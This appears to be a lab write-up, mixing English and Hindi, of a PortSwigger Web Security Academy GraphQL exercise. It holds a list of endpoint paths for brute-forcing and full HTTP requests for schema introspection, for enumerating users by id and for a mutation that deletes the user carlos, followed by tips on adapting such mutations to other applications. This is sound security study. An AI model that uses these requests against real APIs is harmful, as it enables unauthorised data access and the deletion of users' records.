
Some GraphQL end points 

/graphql<br/>
/api<br/>
/api/graphql<br/>
/graphql/api<br/>
/graphql/graphql<br/>
/graphql/v1<br/>
/graphql/inventory-service<br/>
/graphql-server<br/>
/gql<br/>

------------------------------------------------------------------------------------------------------------------------------------------------------

GET /$Brute-force-end-point$ HTTP/1.1<br/>
Host: 0a3e001c032866a6819185b600420085.web-security-academy.net<br/>
Cookie: session=FOS3Dp3EidWsLz8QogdVn7bWbY3CoMzv<br/>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br/>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br/>
Accept-Language: en-US,en;q=0.5<br/>
Accept-Encoding: gzip, deflate<br/>
Referer: https://0a3e001c032866a6819185b600420085.web-security-academy.net/product?productId=2<br/>
Upgrade-Insecure-Requests: 1<br/>
Sec-Fetch-Dest: document<br/>
Sec-Fetch-Mode: navigate<br/>
Sec-Fetch-Site: same-origin<br/>
Sec-Fetch-User: ?1<br/>
Te: trailers<br/>
Connection: close<br/>


![image](https://github.com/Jeetu-study/GraphQL/assets/132050251/747ec4fb-9288-4be4-bfd6-f46f6f26133b)
<br/><br/>

I Got Resonse {  "Query not present"  }<br/>

Means we can use Query <br/><br/>

GET /api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D HTTP/1.1<br/>
Host: 0a3e001c032866a6819185b600420085.web-security-academy.net<br/>
Cookie: session=FOS3Dp3EidWsLz8QogdVn7bWbY3CoMzv<br/>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br/>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br/>
Accept-Language: en-US,en;q=0.5<br/>
Accept-Encoding: gzip, deflate<br/>
Referer: https://0a3e001c032866a6819185b600420085.web-security-academy.net/product?productId=2<br/>
Upgrade-Insecure-Requests: 1<br/>
Sec-Fetch-Dest: document<br/>
Sec-Fetch-Mode: navigate<br/>
Sec-Fetch-Site: same-origin<br/>
Sec-Fetch-User: ?1<br/>
Te: trailers<br/>
Connection: close<br/><br/>

**__schema is very important .. Ye Root type ke under hota hai GraphQL ke under jisse hum overall schema ki information ko retrive kr sakte hai<br/>**

And our payload is ( ?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D )<br/>

![image](https://github.com/Jeetu-study/GraphQL/assets/132050251/04576f45-b9da-43dd-b31e-37af7b7b716a)
<br/><br/>

Try to retrive all user name first<br/>

GET /api?query={getUser(id:1){id%0d%0ausername}} HTTP/1.1<br/>
Host: 0a280037032646c680eafde600ae00bd.web-security-academy.net<br/>
Cookie: session=ZCcMdF977MB8RewqXC048LQamGIXA3Wu<br/>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br/>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5<br/>
Accept-Encoding: gzip, deflate<br/>
Referer: https://0a280037032646c680eafde600ae00bd.web-security-academy.net/my-account?id=wiener<br/>
Upgrade-Insecure-Requests: 1<br/>
Sec-Fetch-Dest: document<br/>
Sec-Fetch-Mode: navigate<br/>
Sec-Fetch-Site: same-origin<br/>
Sec-Fetch-User: ?1<br/>
Te: trailers<br/>
Connection: close<br/>

![image](https://github.com/Jeetu-study/GraphQL/assets/132050251/45c203cf-b074-49ed-9ffe-470a1bae5192)<br/>

**Now we can try brute force in id perametrs**<br/>

![image](https://github.com/Jeetu-study/GraphQL/assets/132050251/849a7db9-8f3c-4695-8167-39582ab67aab)<br/>


![image](https://github.com/Jeetu-study/GraphQL/assets/132050251/fbdb5037-7f74-406d-9f0a-49af4c41fd9b)<br/>


**After get some information we can use mutation type**<br/>

**mutation ka use krke user data ko delete update or create kr sakta hai or in this lab we need to delete user carlos to hum query keyword ke sath mutation ka use krenge and user ko delete krenege**<br/><br/>


GET /api?query=mutation{deleteOrganizationUser(input:{id:3}){user{id}}} HTTP/1.1<br/>
Host: 0a3e001c032866a6819185b600420085.web-security-academy.net<br/>
Cookie: session=FOS3Dp3EidWsLz8QogdVn7bWbY3CoMzv<br/>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br/>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br/>
Accept-Language: en-US,en;q=0.5<br/>
Accept-Encoding: gzip, deflate<br/>
Referer: https://0a3e001c032866a6819185b600420085.web-security-academy.net/product?productId=2<br/>
Upgrade-Insecure-Requests: 1<br/>
Sec-Fetch-Dest: document<br/>
Sec-Fetch-Mode: navigate<br/>
Sec-Fetch-Site: same-origin<br/>
Sec-Fetch-User: ?1<br/>
Te: trailers<br/>
Connection: close<br/>


![image](https://github.com/Jeetu-study/GraphQL/assets/132050251/fdf0d043-24f5-4749-9b52-af5b3561eae3)<br/>

**yaha per humne id:3 use kiya hai coz carlos ka id 3 tha and mutation ka use krke humne carlos ko delete kr diya**<br/>

#Note mutation ki query diffrent ho sakti hai application to application<br/>

like kuch example<br/>

![image](https://github.com/Jeetu-study/GraphQL/assets/132050251/05c14c40-b9a6-46ee-9093-7927e89800b7)<br/><br/>

![image](https://github.com/Jeetu-study/GraphQL/assets/132050251/9c71bfab-cc62-4579-8e58-daf9924839c3)<br/><br/>

![image](https://github.com/Jeetu-study/GraphQL/assets/132050251/50111114-3644-4b10-96ca-3c7fd95bbf2d)<br/><br/>

--------------------------------------------------------------------------------------------------------------------------------------------------

#Means jaha per humne api?query=mutation{deleteOrganizationUser(input:{id:3}){user{id}}} ka use kiya hai 
waha per **deleteOrganizationUser* ki jagaha deleteEntity , removeProduct , deleteUser , kuch bhi ho sakta hai or id bhi diffrent
ho sakti hai , May be ID ki jagha kuch or ho ya kuch bhi na ho , ye application to application check krna hoga,
yaha per hum delete ka use kr rahe hai but **mutation** ka use krke aap delete ke sath update create bhi kr sakte hai or usi hisab se query ko
modify krke request send krna hoga






